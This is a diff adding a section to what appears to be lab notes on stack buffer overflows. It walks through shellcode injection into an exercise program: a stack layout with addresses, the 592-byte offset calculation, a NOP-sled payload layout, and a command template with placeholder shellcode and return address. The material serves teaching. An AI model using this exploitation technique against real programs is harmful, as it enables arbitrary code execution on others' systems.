@@ -40,6 +40,57 @@ HIGH ADDRESS
 
 So if you write 364 bytes into `username_buffer` (which only holds 16), you reach `auth_flag`. The 365th byte overwrites it with a non-zero value → access granted.
 
+
+## Part 2 — extra.c (Shellcode Injection)
+
+**Goal:** Spawn a shell even though the program doesn't call `system()`.
+
+**Stack layout inside `main`:**
+
+```
+LOW ADDRESS
+┌──────────────────┐ 0x7fffffffe8e0  ← password[256]
+│    password      │
+├──────────────────┤ 0x7fffffffe9e0  ← username[256]  ← YOU INJECT HERE
+│    username      │
+├──────────────────┤ 0x7fffffffeae0  ← team_var[333]
+│    team_var      │
+├──────────────────┤
+│                  │
+├──────────────────┤ 0x7fffffffec30  ← saved RBP
+├──────────────────┤ 0x7fffffffec38  ← return address ← YOU OVERWRITE THIS
+└──────────────────┘
+HIGH ADDRESS
+```
+
+**The math:**
+
+```
+RBP - username_start = 0x7fffffffec30 - 0x7fffffffe9e0 = 0x250 = 592 bytes
+```
+
+**What goes into username:**
+
+```
+[NOP sled ~560 bytes][shellcode ~30 bytes][fake RBP 8 bytes][→ address inside NOP sled]
+ ←————————— 592 bytes ————————————————→
+```
+
+**Why 592 bytes of NOP+shellcode?**
+
+- That's exactly the gap from `username` start to `saved RBP`
+- The shellcode must land **before** RBP — past it you're corrupting saved RBP and the return address (which you need to control cleanly)
+- NOP sled fills the space so you can jump anywhere in it reliably
+
+**The exploit:**
+
+bash
+
+```bash
+./extra `python -c "print('\x90'*560 + SHELLCODE + 'B'*8 + RETURN_ADDR)"` password
+```
+
+When `main` hits `ret`, it pops your fake return address into RIP, jumps into the NOP sled, slides down into shellcode → shell spawns.
 **The exploit:**
 
 bash
